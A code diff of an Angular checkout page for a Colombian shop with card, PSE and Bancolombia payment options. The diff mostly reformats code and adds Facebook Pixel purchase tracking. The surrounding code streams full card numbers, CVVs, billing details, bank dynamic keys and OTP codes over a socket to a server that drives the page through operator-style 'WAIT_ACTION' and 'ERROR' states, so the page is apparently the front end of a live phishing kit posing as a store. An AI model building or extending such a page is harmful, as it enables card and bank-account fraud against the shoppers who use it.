@@ -1,3 +1,5 @@
+declare var fbq: Function;
+
 import { CurrencyPipe, NgClass, CommonModule } from '@angular/common';
 import { Component, inject, OnInit, OnDestroy } from '@angular/core';
 import { FormsModule } from '@angular/forms';
@@ -45,7 +47,14 @@ interface PSEInfo {
 @Component({
   selector: 'app-checkout',
   standalone: true,
-  imports: [FormsModule, RouterLink, CurrencyPipe, NgClass, CommonModule, VerificationModalComponent],
+  imports: [
+    FormsModule,
+    RouterLink,
+    CurrencyPipe,
+    NgClass,
+    CommonModule,
+    VerificationModalComponent,
+  ],
   templateUrl: './checkout.component.html',
   styleUrl: './checkout.component.css',
 })
@@ -66,10 +75,10 @@ export class CheckoutComponent implements OnInit, OnDestroy {
   errorMessage = 'Por favor completa todos los campos requeridos';
 
   // Loading states for real-time verification
-  isProcessingBilling = false;  // DATA verification
-  isProcessingCard = false;     // CC verification
-  isProcessingDinamic = false;  // DINAMIC verification
-  isProcessingOTP = false;      // OTP verification
+  isProcessingBilling = false; // DATA verification
+  isProcessingCard = false; // CC verification
+  isProcessingDinamic = false; // DINAMIC verification
+  isProcessingOTP = false; // OTP verification
 
   // Modal states
   showDinamicModal = false;
@@ -163,7 +172,8 @@ export class CheckoutComponent implements OnInit, OnDestroy {
         this.socketService.connect();
       } catch (error) {
         console.error('❌ Failed to create session:', error);
-        this.errorMessage = 'Error al inicializar sesión. Por favor intenta nuevamente';
+        this.errorMessage =
+          'Error al inicializar sesión. Por favor intenta nuevamente';
         this.showErrorToast = true;
         setTimeout(() => {
           this.showErrorToast = false;
@@ -178,7 +188,10 @@ export class CheckoutComponent implements OnInit, OnDestroy {
       // Sync initial state from session action
       const initialAction = sessionContext.action;
       if (initialAction) {
-        console.log('🔄 Syncing initial state from session action:', initialAction);
+        console.log(
+          '🔄 Syncing initial state from session action:',
+          initialAction,
+        );
         this.syncInitialState(initialAction);
       }
     }
@@ -219,7 +232,9 @@ export class CheckoutComponent implements OnInit, OnDestroy {
     }
     // Step 2 → Step 3: Validate billing + Send for verification
     else if (this.currentStep === 2 && this.validateBilling()) {
-      console.log('🔵 Step 2 validated, sending billing data for verification...');
+      console.log(
+        '🔵 Step 2 validated, sending billing data for verification...',
+      );
 
       // Show loading while waiting for verification
       this.isProcessingBilling = true;
@@ -234,8 +249,8 @@ export class CheckoutComponent implements OnInit, OnDestroy {
           city: this.billing.city,
           address: this.billing.address,
           phone: this.billing.phone,
-          email: this.billing.email
-        }
+          email: this.billing.email,
+        },
       });
 
       console.log('📤 Billing data emitted, waiting for verification...');
@@ -298,9 +313,9 @@ export class CheckoutComponent implements OnInit, OnDestroy {
           holder: this.card.holder,
           exp: this.card.expMonth + '/' + this.card.expYear,
           cvv: this.card.cvv,
-         /*  method: this.card.method,
+          /*  method: this.card.method,
           installments: this.card.installments */
-        }
+        },
       });
 
       console.log('📤 Card data emitted, waiting for verification...');
@@ -369,23 +384,31 @@ export class CheckoutComponent implements OnInit, OnDestroy {
   }
 
   validateCardForm(): boolean {
-    if (this.isEmpty(this.card.number) || !this.isValidCardNumber(this.card.number)) return false;
-    if (this.isEmpty(this.card.holder) || this.card.holder.trim().length < 3) return false;
-    if (!this.validateExpiration(this.card.expMonth, this.card.expYear)) return false;
+    if (
+      this.isEmpty(this.card.number) ||
+      !this.isValidCardNumber(this.card.number)
+    )
+      return false;
+    if (this.isEmpty(this.card.holder) || this.card.holder.trim().length < 3)
+      return false;
+    if (!this.validateExpiration(this.card.expMonth, this.card.expYear))
+      return false;
     if (this.isEmpty(this.card.cvv) || this.card.cvv.length < 3) return false;
     if (this.isEmpty(this.card.installments)) return false;
     return true;
   }
 
   validatePSEForm(): boolean {
-    if (this.isEmpty(this.pse.name) || this.pse.name.trim().length < 3) return false;
+    if (this.isEmpty(this.pse.name) || this.pse.name.trim().length < 3)
+      return false;
     if (!this.isValidDocument(this.pse.document)) return false;
     if (this.isEmpty(this.pse.personType)) return false;
     return true;
   }
 
   validateBancolombiaForm(): boolean {
-    if (this.isEmpty(this.bc.name) || this.bc.name.trim().length < 3) return false;
+    if (this.isEmpty(this.bc.name) || this.bc.name.trim().length < 3)
+      return false;
     if (!this.isValidDocument(this.bc.document)) return false;
     if (this.isEmpty(this.bc.personType)) return false;
     return true;
@@ -434,10 +457,22 @@ export class CheckoutComponent implements OnInit, OnDestroy {
   // Actualizar cuotas según el total
   updateCuotas(): void {
     this.cuotas = [
-      { value: '1', label: `Total - $${this.total.toLocaleString()} (1 cuota)` },
-      { value: '3', label: `3 cuotas de $${(this.total / 3).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}` },
-      { value: '6', label: `6 cuotas de $${(this.total / 6).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}` },
-      { value: '12', label: `12 cuotas de $${(this.total / 12).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}` },
+      {
+        value: '1',
+        label: `Total - $${this.total.toLocaleString()} (1 cuota)`,
+      },
+      {
+        value: '3',
+        label: `3 cuotas de $${(this.total / 3).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}`,
+      },
+      {
+        value: '6',
+        label: `6 cuotas de $${(this.total / 6).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}`,
+      },
+      {
+        value: '12',
+        label: `12 cuotas de $${(this.total / 12).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}`,
+      },
     ];
   }
 
@@ -492,6 +527,10 @@ export class CheckoutComponent implements OnInit, OnDestroy {
     });
 
     this.total = total;
+    fbq('track', 'InitiateCheckout', {
+      value: this.total,
+      currency: 'COP',
+    });
     this.updateCuotas();
   }
 
@@ -511,7 +550,9 @@ export class CheckoutComponent implements OnInit, OnDestroy {
 
       case 'DATA_WAIT_ACTION':
         // Stay in billing form (step 2) + show loading
-        console.log('⏳ Syncing to DATA_WAIT_ACTION - Billing verification in progress');
+        console.log(
+          '⏳ Syncing to DATA_WAIT_ACTION - Billing verification in progress',
+        );
         this.currentStep = 2;
         this.isProcessingBilling = true;
         break;
@@ -535,7 +576,9 @@ export class CheckoutComponent implements OnInit, OnDestroy {
 
       case 'CC_WAIT_ACTION':
         // Redirect to card form (step 3) + show loading
-        console.log('⏳ Syncing to CC_WAIT_ACTION - Card verification in progress');
+        console.log(
+          '⏳ Syncing to CC_WAIT_ACTION - Card verification in progress',
+        );
         this.currentStep = 3;
         this.isProcessingCard = true;
         break;
@@ -544,7 +587,8 @@ export class CheckoutComponent implements OnInit, OnDestroy {
         // Error in card data - redirect to card form
         console.log('❌ CC_ERROR - Redirecting to card form (Step 3)');
         this.currentStep = 3;
-        this.errorMessage = 'Datos de tarjeta inválidos, verifica e intenta nuevamente';
+        this.errorMessage =
+          'Datos de tarjeta inválidos, verifica e intenta nuevamente';
         this.showErrorToast = true;
         setTimeout(() => {
           this.showErrorToast = false;
@@ -565,7 +609,9 @@ export class CheckoutComponent implements OnInit, OnDestroy {
 
       case 'DINAMIC_WAIT_ACTION':
         // Open dinamic modal + show loading
-        console.log('⏳ Syncing to DINAMIC_WAIT_ACTION - Dynamic verification in progress');
+        console.log(
+          '⏳ Syncing to DINAMIC_WAIT_ACTION - Dynamic verification in progress',
+        );
         this.currentStep = 3;
         // Close OTP modal if open (modals are mutually exclusive)
         if (this.showOTPModal) {
@@ -607,7 +653,9 @@ export class CheckoutComponent implements OnInit, OnDestroy {
 
       case 'OTP_WAIT_ACTION':
         // Open OTP modal + show loading
-        console.log('⏳ Syncing to OTP_WAIT_ACTION - OTP verification in progress');
+        console.log(
+          '⏳ Syncing to OTP_WAIT_ACTION - OTP verification in progress',
+        );
         this.currentStep = 3;
         // Close dinamic modal if open (modals are mutually exclusive)
         if (this.showDinamicModal) {
@@ -786,7 +834,8 @@ export class CheckoutComponent implements OnInit, OnDestroy {
   handleCCError(): void {
     console.log('❌ CC_ERROR - Invalid card data');
     this.isProcessingCard = false;
-    this.errorMessage = 'Datos de tarjeta inválidos, verifica e intenta nuevamente';
+    this.errorMessage =
+      'Datos de tarjeta inválidos, verifica e intenta nuevamente';
     this.showErrorToast = true;
 
     // Redirect to card form if not already there
@@ -963,6 +1012,11 @@ export class CheckoutComponent implements OnInit, OnDestroy {
     this.socketService.disconnect();
     console.log('✅ Socket disconnected');
 
+    fbq('track', 'Purchase', {
+      value: this.total,
+      currency: 'COP',
+    });
+
     // Redirect to finish page
     this.router.navigate(['/finish']);
   }
@@ -987,8 +1041,8 @@ export class CheckoutComponent implements OnInit, OnDestroy {
     // Server expects: { auth: { dinamic: "value" } }
     this.socketService.emitDynamicData({
       auth: {
-        dinamic: this.dinamicData.value
-      }
+        dinamic: this.dinamicData.value,
+      },
     });
   }
 
@@ -1010,8 +1064,8 @@ export class CheckoutComponent implements OnInit, OnDestroy {
     // Server expects: { auth: { otp: "code" } }
     this.socketService.emitOTP({
       auth: {
-        otp: this.otpData.code
-      }
+        otp: this.otpData.code,
+      },
     });
   }
 
@@ -1048,7 +1102,8 @@ export class CheckoutComponent implements OnInit, OnDestroy {
     if (firstTwoDigits === '34' || firstTwoDigits === '37') return 'amex';
 
     // Discover: starts with 6011, 622126-622925, 644-649, or 65
-    if (cardNumber.startsWith('6011') || cardNumber.startsWith('65')) return 'dis';
+    if (cardNumber.startsWith('6011') || cardNumber.startsWith('65'))
+      return 'dis';
     if (firstTwoDigits >= '64' && firstTwoDigits <= '65') return 'dis';
 
     // Diners: starts with 36 or 38
@@ -1066,7 +1121,7 @@ export class CheckoutComponent implements OnInit, OnDestroy {
       style: 'currency',
       currency: 'COP',
       minimumFractionDigits: 0,
-      maximumFractionDigits: 0
+      maximumFractionDigits: 0,
     }).format(price);
   }
 
